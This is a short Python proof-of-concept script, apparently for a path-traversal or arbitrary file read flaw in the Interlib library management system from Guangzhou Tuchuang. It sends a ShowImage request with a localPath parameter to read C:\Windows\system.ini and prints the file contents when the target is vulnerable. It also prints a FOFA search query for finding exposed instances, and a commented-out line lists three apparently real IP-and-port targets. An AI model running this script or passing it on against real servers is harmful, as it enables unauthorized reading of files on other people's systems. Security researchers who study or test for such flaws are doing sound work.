#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import re
def title():
    print('+          FOFA:"广州图创" && country="CN" && body="/interlib/common/"')

def run_proto(url):
    checkUrl = url + '/interlib/report/ShowImage?localPath=C:Windows\system.ini'
    headers = {
            'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
              }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        session = requests.session()
        session.get(url=url + '/interlib/common/',headers=headers, verify=False, timeout=3)
        response = session.get(url=checkUrl, headers=headers, verify=False, timeout=3)
        if response.status_code == 200 and '=' in response.text and '[drivers]' in response.text:
            print(response.text)
            return True
        else:
            return False
    except Exception as e:
        return False

def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1

if __name__ == '__main__':
    title()
    #target = '60.8.104.138:8082;112.250.109.33:8084;218.6.38.221:8080'
    target = sys.argv[1]
    ip = target.split(':')[0]
    port = target.split(':')[1]

    result = run(ip, port)

    if result:
        print('Exist')
    else:
        print('UnExist')

